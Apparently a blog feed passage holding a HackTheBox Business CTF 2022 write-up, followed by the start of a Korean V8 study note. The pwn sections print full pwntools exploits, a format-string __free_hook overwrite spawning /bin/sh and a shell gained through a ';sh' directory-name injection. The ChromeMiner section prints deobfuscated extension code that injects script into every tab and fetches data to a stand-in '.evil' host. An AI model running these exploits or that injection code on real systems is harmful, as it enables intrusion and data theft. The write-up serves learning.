    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">setInterval</span><span class="dl">'</span><span class="p">](</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="mi">64</span><span class="p">);</span>
      <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getRandomValues</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">);</span>
      <span class="k">if </span><span class="p">(</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextDecoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">decode</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">))[</span><span class="dl">'</span><span class="s1">endsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">j</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">))[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]);</span>
        <span class="nx">j</span><span class="p">[</span><span class="dl">'</span><span class="s1">set</span><span class="dl">'</span><span class="p">](</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
        <span class="nx">j</span><span class="p">[</span><span class="dl">'</span><span class="s1">set</span><span class="dl">'</span><span class="p">](</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">)),</span> <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]);</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">hxxps://qwertzuiop123.evil/</span><span class="dl">'</span> <span class="o">+</span> 
        <span class="p">[...</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">encrypt</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">iv</span><span class="dl">'</span><span class="p">]:</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">)},</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">importKey</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">raw</span><span class="dl">'</span><span class="p">,</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">decrypt</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">iv</span><span class="dl">'</span><span class="p">]:</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">)},</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">importKey</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">raw</span><span class="dl">'</span><span class="p">,</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">),</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">},</span> <span class="kc">true</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">decrypt</span><span class="dl">'</span><span class="p">]),</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">]((</span><span class="dl">'</span><span class="s1">E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">match</span><span class="dl">'</span><span class="p">](</span><span class="sr">/../g</span><span class="p">)[</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">](</span><span class="nx">h</span> <span class="o">=&gt;</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">parseInt</span><span class="dl">'</span><span class="p">](</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)))),</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">},</span> <span class="kc">true</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">encrypt</span><span class="dl">'</span><span class="p">]),</span> <span class="nx">j</span><span class="p">))][</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">](</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">padStart</span><span class="dl">'</span><span class="p">](</span><span class="mi">2</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">))[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">""</span><span class="p">));</span>
      <span class="p">}</span>
    <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">;</span>

<span class="nx">chrome</span><span class="p">[</span><span class="dl">'</span><span class="s1">tabs</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onUpdated</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addListener</span><span class="dl">'</span><span class="p">]((</span><span class="nx">tabVar</span><span class="p">,</span> <span class="nx">changeInfo</span><span class="p">,</span> <span class="nx">tab</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span> <span class="k">in</span> <span class="nx">tab</span> <span class="o">&amp;&amp;</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">]</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">startsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">https://</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">startsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">http://</span><span class="dl">'</span><span class="p">)))</span> <span class="p">{</span>
    <span class="nx">chrome</span><span class="p">[</span><span class="dl">'</span><span class="s1">scripting</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">executeScript</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">target</span><span class="dl">'</span><span class="p">]:</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">tabId</span><span class="dl">'</span><span class="p">]:</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">]},</span> <span class="na">function</span><span class="p">:</span> <span class="nx">iF</span><span class="p">});</span>
  <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<h3 id="2-decrypt-with-aes-256">2. Decrypt with AES-256</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">)</span>
<span class="o">&lt;</span><span class="n">Crypto</span><span class="p">.</span><span class="n">Cipher</span><span class="p">.</span><span class="n">AES</span><span class="p">.</span><span class="n">AESCipher</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7fae19feb790</span><span class="o">&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xe2</span><span class="s">B</span><span class="se">\xe6</span><span class="s">Ba</span><span class="se">\xd2\x19</span><span class="s">i</span><span class="se">\xf6</span><span class="s">[</span><span class="se">\xed\xf9</span><span class="s">T</span><span class="se">\x90\n\x99</span><span class="s">R</span><span class="se">\t\t\x9f\xb6\xc3\xc6\x82\xc0\xd9\xc4\xb2</span><span class="s">u</span><span class="se">\xb1\xc2\x12\xbc\x18\x8e\x08\x82\xb6\xbe</span><span class="s">r</span><span class="se">\xc7</span><span class="s">I!</span><span class="se">\x12</span><span class="s">A</span><span class="se">\x18\x7f\xa8</span><span class="sh">'</span><span class="p">)</span>
<span class="sa">b</span><span class="sh">'</span><span class="s">HTB{__mY_vRy_owN_CHR0me_M1N3R__}</span><span class="se">\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10</span><span class="sh">'</span>
</code></pre></div></div>

<hr />

<h2 id="for--linas-invitation">FOR : Lina‚Äôs Invitation</h2>
<p>writing‚Ä¶.</p>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="ctf" /><summary type="html"><![CDATA[Summary Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz kernel exploitation. RSA, elgamel simple attack in crypto. and etc.. Tasks Pwnableüíª Payback Insider OpenDoor Cryptographyüí° BBGun06 (+ revenge) ElElGamal Reversing‚öôÔ∏è BreakOut ChromeMiner, Assisted Forensicüîé Lina‚Äôs Invitation PWN : Payback 1. Analyze mitigations are here: [*] '/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./.glibc/' I found that delete_bot function has Format string bug when I send delete_reason. int delete_bot() { unsigned int id; id = getId(); // 0 ~ 31 if (botBuf[id].url != NULL) { char reasonbuf[MAX_REASON_SIZE]; memset(reasonbuf, '\x00', MAX_REASON_SIZE); // gather statistics printf("\n[*] Enter the reason of deletion: "); read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1); free(botBuf[id].url); botBuf[id].url = NULL; puts("\n[+] Bot Deleted successfully! | Reason: "); printf(reasonbuf); return 0; } puts("\n[!] Error: Unable to fetch the requested bot entry.\n"); } reasonbuf is in a stack area so I can check FSB attack offset with input buffer. If I manage __free_hook, I can call system("/bin/sh\x00") when I call delete_bot. Setting bot‚Äôs URL to /bin/sh\x00 and calling free can trigger shell. Let‚Äôs exploit! 2. Exploit Code from pwn import * # p=process("./payback") p=remote("142.93.37.110",30669) e=ELF("./payback") l=ELF(".glibc/libc.so.6") def add(): p.sendlineafter("&gt;&gt; ", str(1).encode()) p.sendlineafter(": ", "/bin/sh\x00") p.sendlineafter(": ", "0") def delete(id, fsb_pay): p.sendlineafter("&gt;&gt; ", str(3)) p.sendlineafter(": ", str(id)) pause() p.sendafter(": ", fsb_pay) add() delete(0, "%p") # overwrite offset : 8 p.recvuntil("Reason: \n") libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym['__free_hook'] system = libc_base + l.sym['system'] log.info(hex(libc_base)) log.info(hex(free_hook)) add() low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32 if mid &gt; low: rmid = mid-low else: rmid = 0x10000+mid-low if high &gt; mid: rhigh = high-mid else: rhigh = 0x10000+high-mid log.info(hex(low)) log.info(hex(mid)) log.info(hex(high)) payload = '' payload += '%{}c'.format(low) payload += '%13$hn' payload += '%{}c'.format(rmid) payload += '%14$hn' payload += '%{}c'.format(rhigh) payload += '%15$hn' payload += 'A' payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4) delete(0, payload) add() delete(0, b"pwned") p.interactive() Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}. PWN : Insider 1. Analyze Binary run FTP cli program with 30 commands. USER ;) : compare with ;) string, if it‚Äôs correct, prepare PASS command. PASS ;) : same with USER command, if password correct, I can use all of cmds. BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition. LIST : get current working directory (CWD) by using getcwd() function. also run ls -al [result of getcwd()] with popen. if process run successfully, result should be written in console. CWD [path] : change working directory with my own path. MKDR [path] : make directory with my own path. .. etc BKDR command can leak stack area or overwrite stack area. I found unchanged stack position that makes denied access to LIST command. (value : -1, LIST NOT ALLOWED!) at first, I used RETR command to read /flag.txt, but this file‚Äôs permission is only read in root, r--------. Need to find another way.. v131 should be more than 0, so if I found right offset of v131, can be overwritten by %[offset]$n. 2. After Getting shell..? MKDR ;sh : make directory named ;sh. it‚Äôs legal expression in linux. CWD ;sh : change working directory to /home/ctf/;sh LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!! In the shell, cd /home/ctf =&gt; I noticed that get_flag file‚Äôs RUNPATH is ./, so changing working directory to /home/ctf is necessary. In the shell, ./get_flag =&gt; Execute! In the shell, exit =&gt; for receiving results of entire commands. (because commands is running in popen process) 3. Exploit Code from pwn import * #context.log_level = 'debug' p = remote("104.248.175.153",30467) #p = process('./chall') def qwer(x, noRecv=False): if not noRecv: p.recv() p.send(x) sleep(0.5) qwer("USER ;)") qwer("PASS ;)") qwer("BKDR %p %p %p %p %p %p %p") p.recvuntil("(nil) 0x") leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak)) pay = b'BKDR' pay += b' %1035$n' #pause() pay = pay.ljust(0x28-3, b'b') pay += p64(leak) pay += b"ASDF" qwer(pay) #qwer("STOR .profile") #qwer("alias ls='sh;ls'".ljust(0x1000, 'a') + 'LIST', True) #p.shutdown('send') qwer("MKDR ;sh") qwer("CWD ;sh") qwer("LIST") p.sendline("cd /home/ctf") p.sendline("./get_flag") p.sendline("exit") p.interactive() Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}. PWN : OpenDoor ! REDACTED ! Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb CRYPTO : BBGun06 1. Analyze BBGun06 / revenge has same verify(self,message, signature) code: def verify(self, message, signature): keylength = len(long_to_bytes(self.n)) decrypted = self.encrypt(signature) clearsig = decrypted.to_bytes(keylength, "big") r = re.compile(b'\x00\x01\xff+?\x00(.{15})(.{20})', re.DOTALL) m = r.match(clearsig) if not m: raise VerificationError('Verification failed') if m.group(1) != self.asn1: raise VerificationError('Verification failed') if m.group(2) != sha1(message).digest(): raise VerificationError('Verification failed') return True And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer. Decrypted message is same when I give bytes string that has same integer result. That means, dec("0001") == dec("01"). It‚Äôs simple! send given signature with 00 :D, 00 + sig revenge prob has the same solving process lol:) See below. 2. Exploit (Manual) // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32'06_519n47u23_f02932y} signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f ... Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32's} CRYPTO : ElElGamal I didn‚Äôt know about ElGamal in cryptography, so I searched a lot. writing‚Ä¶ ‚Äî REV : BreakOut 1. FLAG Recovering Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running! Download bkd file in website. Realize it‚Äôs web server made by C++. Find secretGet function and get flag. 2. Get FLAG Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}. REV : ChromeMiner Fully obfuscated js Challenge. 1. Recover with hand async function iF() { if (!('injected' in document)) { document['injected'] = true; window['setInterval'](async () =&gt; { y = new window['Uint8Array'](64); window['crypto']['getRandomValues'](y); if (new window['TextDecoder']('utf-8')['decode'](await window['crypto']['subtle']['digest']('sha-256', y))['endsWith']('chrome')) { j = new window['Uint8Array'](y['byteLength'] + (await window['crypto']['subtle']['digest']('sha-256', y))['byteLength']); j['set'](new window['Uint8Array'](y), 0); j['set'](new window['Uint8Array'](await window['crypto']['subtle']['digest']('sha-256', y)), y['byteLength']); window['fetch']('hxxps://qwertzuiop123.evil/' + [...new window['Uint8Array'](await window['crypto']['subtle']['encrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', await window['crypto']['subtle']['decrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_'), {['name']: 'AES-CBC'}, true, ['decrypt']), new window['Uint8Array'](('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8')['match'](/../g)['map'](h =&gt; window['parseInt'](h, 16)))), {['name']: 'AES-CBC'}, true, ['encrypt']), j))]['map'](x =&gt; x['toString'](16)['padStart'](2, "0"))['join']("")); } }, 1); } } ; chrome['tabs']['onUpdated']['addListener']((tabVar, changeInfo, tab) =&gt; { if ('url' in tab &amp;&amp; tab['url'] != null &amp;&amp; (tab['url']['startsWith']('https://') || tab['url']['startsWith']('http://'))) { chrome['scripting']['executeScript']({['target']: {['tabId']: tab['id']}, function: iF}); } }); 2. Decrypt with AES-256 &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &gt;&gt;&gt; cipher.decrypt(b'\xe2B\xe6Ba\xd2\x19i\xf6[\xed\xf9T\x90\n\x99R\t\t\x9f\xb6\xc3\xc6\x82\xc0\xd9\xc4\xb2u\xb1\xc2\x12\xbc\x18\x8e\x08\x82\xb6\xber\xc7I!\x12A\x18\x7f\xa8') b'HTB{__mY_vRy_owN_CHR0me_M1N3R__}\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10' FOR : Lina‚Äôs Invitation writing‚Ä¶.]]></summary></entry><entry><title type="html">[V8 Study] 00-introduction</title><link href="http://localhost:4000/note/V8-introduction/" rel="alternate" type="text/html" title="[V8 Study] 00-introduction" /><published>2022-05-17T16:30:00+09:00</published><updated>2022-05-17T16:30:00+09:00</updated><id>http://localhost:4000/note/V8-introduction</id><content type="html" xml:base="http://localhost:4000/note/V8-introduction/"><![CDATA[<p><strong>[!] Ïö∞ÏÑ†Ï†ÅÏúºÎ°ú ÌïúÍ∏ÄÎ°ú ÏûëÏÑ±ÌïòÏó¨ Ï∂îÌõÑ Î≤àÏó≠Ìï† ÏòàÏ†ï.</strong></p>

<h2 id="summary">Summary</h2>
<p>Ïö∞Î¶¨Í∞Ä ÎåÄÏ§ëÏ†ÅÏúºÎ°ú ÏÇ¨Ïö©ÌïòÎäî Google Chrome browserÏóêÎäî ÏõπÌéòÏù¥ÏßÄÎ•º ÎèôÏ†ÅÏúºÎ°ú Ïã§ÌñâÏãúÌÇ§Í∏∞ ÏúÑÌï¥ javascriptÍ∞Ä Íµ¨ÎèôÎê† Ïàò ÏûàÎèÑÎ°ù ÏßÄÏõêÌïòÍ≥† ÏûàÎã§. Í∑∏Î†áÎã§Î©¥, JSÎ•º ÏõêÌôúÌïòÍ≤å Ïã§ÌñâÌïòÍ≥† Ïª¥ÌååÏùºÌïòÎäî Ïó≠Ìï†ÏùÄ Ïñ¥Îñ§ Í≤ÉÏù¥ Îß°Í≥† ÏûàÏùÑÍπå? Ïù¥ Ï±ïÌÑ∞ÏóêÏÑúÎäî ÎÇ¥Í∞Ä Í≥µÎ∂ÄÌñàÎçò chromium javascript engineÏù∏ V8Ïóê ÎåÄÌï¥ÏÑú ÏïåÏïÑÎ≥¥Í≥†Ïûê ÌïúÎã§.</p>

<h2 id="v8Ïùò-Íµ¨Ï°∞Îäî-Ïñ¥ÎñªÍ≤å-ÎêòÏñ¥-ÏûàÏùÑÍπå">V8Ïùò Íµ¨Ï°∞Îäî Ïñ¥ÎñªÍ≤å ÎêòÏñ¥ ÏûàÏùÑÍπå?</h2>

<p>V8Í∞ôÏùÄ Í≤ΩÏö∞ Chrome Íµ¨Îèô Ïãú ÌïòÎÇòÏùò ÌîÑÎ°úÏÑ∏Ïä§Î°ú Ïã§ÌñâÎêòÏñ¥ heap Î∞è stack Î©îÎ™®Î¶¨ ÏòÅÏó≠ÏùÑ Í¥ÄÎ¶¨ÌïòÎ©¥ÏÑú JavascriptÏùò Í∞ÅÏ¢Ö Î≥ÄÏàòÏôÄ Î©îÏÜåÎìúÎ•º Ïã§ÌñâÌïòÎäî Í∞ÄÏû• ÌïµÏã¨Ï†ÅÏù∏ execution fileÎ°ú ÎèôÏûëÌïúÎã§. Ïù¥Ïô∏Ïóê Task/Callback queue, Microtask queue, WebAPI Îì± Îã§ÏñëÌïú ÏöîÏÜåÍ∞Ä Chromium browserÎ•º Íµ¨ÏÑ±ÌïòÍ≥† ÎèôÏûëÌïòÎäîÎç∞ ÏÇ¨Ïö©ÎêúÎã§.</p>

